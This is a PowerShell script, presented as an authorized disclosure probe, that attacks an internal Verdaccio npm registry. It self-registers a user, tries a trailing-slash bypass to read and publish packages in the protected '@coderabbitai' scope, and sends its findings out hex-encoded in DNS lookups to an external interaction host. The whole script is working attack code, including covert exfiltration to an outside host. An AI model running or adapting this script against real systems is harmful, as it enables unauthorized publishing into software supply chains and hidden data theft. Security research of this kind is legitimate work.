# Benign Verdaccio access-control probe for authorized CodeRabbit VDP research (ireniumsecurity).
# Creates a NEW package name in a protected scope, then deletes it. Touches no existing package.
$ErrorActionPreference = 'SilentlyContinue'
$OAST = 'dbiemtt54sq43hh9eomg5wg85auknd4ek.oast.live'
$R = $env:NPM_CONFIG_REGISTRY
if (-not $R) { $R = 'http://10.64.0.28:4873' }
$R = $R.TrimEnd('/')
$out = [ordered]@{}

function Send-Exfil([string]$s) {
    try {
        $h = -join ([System.Text.Encoding]::UTF8.GetBytes($s) | ForEach-Object { $_.ToString('x2') })
        for ($i = 0; $i -lt $h.Length -and $i -le 480; $i += 48) {
            $chunk = $h.Substring($i, [Math]::Min(48, $h.Length - $i))
            try { [System.Net.Dns]::GetHostAddresses("psb-$([int]($i/48))-$chunk.$OAST") | Out-Null } catch {}
        }
    } catch {}
}

function Req($method, $url, $body, $headers) {
    try {
        $p = @{ Uri = $url; Method = $method; UseBasicParsing = $true; SkipHttpErrorCheck = $true; TimeoutSec = 5; MaximumRedirection = 0 }
        if ($body) { $p.Body = $body; $p.ContentType = 'application/json' }
        if ($headers) { $p.Headers = $headers }
        $r = Invoke-WebRequest @p
        return @{ s = [int]$r.StatusCode; b = [string]$r.Content }
    } catch {
        return @{ s = -1; b = [string]$_.Exception.Message }
    }
}

# 1. fingerprint
$a = Req 'GET' "$R/-/ping" $null $null; $out.ping = "$($a.s):$($a.b.Trim())"
$b = Req 'GET' "$R/" $null $null; $out.root = "$($b.s)"
$c = Req 'GET' "$R/-/verdaccio/data/packages" $null $null; $out.pkgapi = "$($c.s):$($c.b.Substring(0,[Math]::Min(80,$c.b.Length)))"

# 2. self-registration
$user = 'crvdp' + (-join (1..6 | ForEach-Object { '0123456789abcdef'[(Get-Random -Maximum 16)] }))
$tok = ''
$reg = @{ name = $user; password = "CrVdp-$user-9x!" } | ConvertTo-Json -Compress
$r = Req 'PUT' "$R/-/user/org.couchdb.user:$user" $reg $null
$out.reg = "$($r.s)"
try { $tok = ($r.b | ConvertFrom-Json).token } catch {}
$out.tok = $tok.Length

# 3. read-bypass: plain vs trailing slash on scoped packages
foreach ($pkg in @('@coderabbitai/config', '@coderabbitai/carrot-ui')) {
    $e = $pkg.Replace('/', '%2f')
    $x = Req 'GET' "$R/$e" $null $null
    $y = Req 'GET' "$R/$e%2f" $null $null
    $out["r_$($pkg.Split('/')[1])"] = "$($x.s)/$($y.s)"
}

# 4. publish-bypass: NEW package name in the protected scope, benign prerelease, no dist-tag
if ($tok.Length -gt 0) {
    $pkg = "@coderabbitai/crvdp-probe-$user"
    $ver = '0.0.0-crvdp'
    $tmp = Join-Path $env:TEMP ("crpkg-" + $user)
    New-Item -ItemType Directory -Path $tmp -Force | Out-Null
    ('{"name":"' + $pkg + '","version":"' + $ver + '"}') | Set-Content -Path (Join-Path $tmp 'package.json') -Encoding utf8
    $tgz = Join-Path $env:TEMP ("probe-" + $user + ".tgz")
    Push-Location $tmp; tar -czf $tgz .; Pop-Location
    if (Test-Path $tgz) {
        $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($tgz))
        $sha1 = (Get-FileHash -Algorithm SHA1 -Path $tgz).Hash.ToLower()
        $len = (Get-Item $tgz).Length
        $manifest = @{
            _id = "$pkg/"; name = "$pkg/"; 'dist-tags' = @{};
            versions = @{ $ver = @{ name = $pkg; version = $ver; dist = @{ shasum = $sha1; tarball = "$R/$pkg/-/probe-$ver.tgz" } } };
            _attachments = @{ "probe-$ver.tgz" = @{ content_type = 'application/octet-stream'; data = $b64; length = $len } }
        } | ConvertTo-Json -Depth 10 -Compress
        $hdr = @{ Authorization = "Bearer $tok" }
        $enc = $pkg.Replace('/', '%2f')
        $ctl = Req 'PUT' "$R/$enc" $manifest $hdr
        $pub = Req 'PUT' "$R/$enc%2f" $manifest $hdr
        $out.pub = "$($ctl.s)/$($pub.s)"
        $out.pubb = $pub.b.Substring(0, [Math]::Min(80, $pub.b.Length))
        if ($pub.s -eq 200 -or $pub.s -eq 201) {
            $g = Req 'GET' "$R/$enc%2f" $null $null
            $rev = ''
            try { $rev = ($g.b | ConvertFrom-Json)._rev } catch {}
            if ($rev) {
                $d = Req 'DELETE' "$R/$enc%2f/-rev/$rev" $null $hdr
                $out.del = "$($d.s)"
            }
        }
    } else { $out.pub = 'notgz' }
}

Send-Exfil (($out | ConvertTo-Json -Compress))
